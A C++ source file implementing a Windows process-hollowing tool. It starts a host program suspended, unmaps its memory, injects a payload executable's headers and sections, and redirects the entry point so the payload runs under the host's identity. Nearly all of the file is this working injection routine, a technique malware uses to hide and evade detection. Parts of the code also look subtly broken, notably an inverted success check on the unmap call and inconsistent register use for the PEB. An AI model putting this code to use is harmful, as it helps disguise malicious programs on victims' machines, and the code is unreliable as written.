#include "Hollowing.h"

Hollowing::Hollowing(const std::string& hostPath, const std::string& payloadPath)
	: m_hostPath(hostPath), m_payloadPath(payloadPath)
{
}

void Hollowing::hollow() const
{
	PROCESS_INFORMATION procInfo = { INVALID_HANDLE_VALUE, INVALID_HANDLE_VALUE };
	LPVOID payloadImage = nullptr;
	PIMAGE_NT_HEADERS piNtHeaders = nullptr;
	LPVOID hostBaseAddr = nullptr;

	try
	{
		loadNativeApiFuncs();
		std::cout << "[+] Native api funcs loaded" << std::endl;

		procInfo = createHostSuspended();
		std::cout << "[+] Host process create as suspended" << std::endl;

		payloadImage = getPayloadImage();
		std::cout << "[+] Payload image loaded" << std::endl;

		piNtHeaders = getNtHeadersFromImage(payloadImage);
		std::cout << "[+] NT headers extracted from the payload image" << std::endl;

		hostBaseAddr = getProcBaseImageAddr(procInfo);
		std::cout << "[+] Host's base image address found" << std::endl;

		hollowProcMemory(procInfo, hostBaseAddr);
		std::cout << "[+] Host process hollowed" << std::endl;

		updateProcBaseImageAddr(procInfo, piNtHeaders);
		std::cout << "[+] Host's base image address updated to payload's base image address" << std::endl;

		updateProcEntryPoint(procInfo, piNtHeaders);
		std::cout << "[+] Host's entry point updated to payload's entry point" << std::endl;

		rebindProcHeaders(procInfo, piNtHeaders, payloadImage);
		std::cout << "[+] Host's headers rebinds to payload's headers" << std::endl;

		rebindProcSections(procInfo, piNtHeaders, payloadImage);
		std::cout << "[+] Host's sections rebinds to payload's sections" << std::endl;

		std::cout << "[+] Process hollowing successfully finished!" << std::endl;

	}
	catch (const HollowingException& e)
	{
		std::cerr << e.what() << std::endl;
	}

	if (payloadImage)
		VirtualFree(payloadImage, 0, MEM_RELEASE);

	if (procInfo.hThread != INVALID_HANDLE_VALUE)
		CloseHandle(procInfo.hThread);

	if (procInfo.hProcess != INVALID_HANDLE_VALUE)
		CloseHandle(procInfo.hProcess);
}

void Hollowing::loadNativeApiFuncs() const
{
	LPVOID funcAddr = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");

	if (!funcAddr)
		throw ImportException("[-] Unable to load proc address from ntdll.dll");

	NtUnmapViewOfSection = reinterpret_cast<pdef_NtUnmapViewOfSection>(funcAddr);
}

PROCESS_INFORMATION Hollowing::createHostSuspended() const
{
	STARTUPINFOA startupInfo = { 0 };
	PROCESS_INFORMATION procInfo;

	if (!CreateProcessA(m_hostPath.c_str(), nullptr, nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &startupInfo, &procInfo))
		throw CreationFailedException("[-] Failed to create suspended process for the host");

	return procInfo;
}

LPVOID Hollowing::getPayloadImage() const
{
	HANDLE fileHandle = CreateFileA(m_payloadPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);

	if (fileHandle == INVALID_HANDLE_VALUE)
		throw CreationFailedException("[-] Failed opening the payload file");
	
	DWORD fileSizeH;
	DWORD fileSizeL = GetFileSize(fileHandle, &fileSizeH);

	if (fileSizeH)
	{
		CloseHandle(fileHandle);
		throw FileSizeException("[-] Payload file size is larger than 2 ^ 32");
	}

	LPVOID img = VirtualAlloc(nullptr, fileSizeL, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!img)
		throw AllocationException("[-] Failed allocating memory for the payload file");

	DWORD bytesRead;

	if (!ReadFile(fileHandle, img, fileSizeL, &bytesRead, nullptr) // ReadFile failed
		|| bytesRead != fileSizeL) // partical read
	{
		CloseHandle(fileHandle);
		VirtualFree(img, 0, MEM_RELEASE);
		throw ReadingException("[-] Failed reading the payload file");
	}

	CloseHandle(fileHandle);

	return img;
}

PIMAGE_NT_HEADERS Hollowing::getNtHeadersFromImage(const LPVOID image) const
{
	PIMAGE_DOS_HEADER piDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
	PIMAGE_NT_HEADERS piNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((reinterpret_cast<LPBYTE>(image) + piDosHeader->e_lfanew));

	if (piNtHeaders->OptionalHeader.Magic != PE32_MAGIC) // isn't PE32
		throw CompatibilityException("[-] The executable must be PE32");

	return piNtHeaders;
}

LPVOID Hollowing::getProcBaseImageAddr(const PROCESS_INFORMATION& procInfo) const
{
	CONTEXT ctx;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	LPBYTE peb = reinterpret_cast<LPBYTE>(ctx.Eax);

	LPVOID baseImg;

	SIZE_T bytesRead;

	if (!ReadProcessMemory(procInfo.hProcess, peb + BASE_IMG_OFFSET_FROM_PEB, &baseImg, sizeof(LPVOID), &bytesRead) // ReadProcessMemory failed
		|| bytesRead != sizeof(LPVOID)) // partical read
		throw ReadingException("[-] Failed reading the base image from host process");
	
	return baseImg;
}

void Hollowing::hollowProcMemory(const PROCESS_INFORMATION& procInfo, const LPVOID baseImg) const
{
	if (!NtUnmapViewOfSection(procInfo.hProcess, baseImg))
		throw ProccessAccessException("[-] Failed hollowing the host process memory");
}

void Hollowing::updateProcBaseImageAddr(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders) const
{
	CONTEXT ctx;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	SIZE_T bytesWritten;

	if (!WriteProcessMemory(procInfo.hProcess, reinterpret_cast<PBYTE>(ctx.Ebx) + BASE_IMG_OFFSET_FROM_PEB, (LPVOID)piNtHeaders->OptionalHeader.ImageBase, sizeof(LPVOID), &bytesWritten) // WriteProcessMemory failed
		|| bytesWritten != sizeof(LPVOID)) // partical write
	{ 
		throw WritingException("[-] Failed writing the new base image into the host process");
	}
}

void Hollowing::updateProcEntryPoint(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders) const
{
	CONTEXT ctx;

	if (!GetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed accessing host thread context");

	ctx.Eax = piNtHeaders->OptionalHeader.ImageBase + piNtHeaders->OptionalHeader.AddressOfEntryPoint;

	if (!SetThreadContext(procInfo.hThread, &ctx))
		throw ProccessAccessException("[-] Failed setting host thread context");
}

void Hollowing::rebindProcHeaders(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const LPVOID image) const
{
	PVOID headersBase = VirtualAllocEx(procInfo.hProcess, reinterpret_cast<PVOID>(piNtHeaders->OptionalHeader.ImageBase),
		piNtHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!headersBase)
		throw AllocationException("[-] Failed allocating memory for header inside the host process");

	SIZE_T bytesWritten;

	if (!WriteProcessMemory(procInfo.hProcess, headersBase, image, piNtHeaders->OptionalHeader.SizeOfImage, &bytesWritten) // WriteProcessMemory failed
		|| bytesWritten != piNtHeaders->OptionalHeader.SizeOfImage) // partical write
	{
		VirtualFreeEx(procInfo.hProcess, reinterpret_cast<PVOID>(piNtHeaders->OptionalHeader.ImageBase), 0, MEM_RELEASE);
		throw WritingException("[-] Failed writing header inside the host process");
	}
}

void Hollowing::rebindProcSections(const PROCESS_INFORMATION& procInfo, const PIMAGE_NT_HEADERS piNtHeaders, const LPVOID image) const
{
	PIMAGE_SECTION_HEADER piSectionHeader;
	PBYTE imageBase = reinterpret_cast<PBYTE>(piNtHeaders->OptionalHeader.ImageBase);

	for (int i = 0; i < piNtHeaders->FileHeader.NumberOfSections; ++i)
	{
		piSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(piNtHeaders + 1) + i;

		SIZE_T bytesWritten;

		if (!WriteProcessMemory(procInfo.hProcess, imageBase + piSectionHeader->VirtualAddress, reinterpret_cast<PBYTE>(image) + piSectionHeader->PointerToRawData, piSectionHeader->SizeOfRawData, &bytesWritten) // WriteProcessMemory failed
			|| bytesWritten != piSectionHeader->SizeOfRawData)  // partical write
		{
			throw WritingException("[-] Failed writing sections into the host process");
		}
	}

}
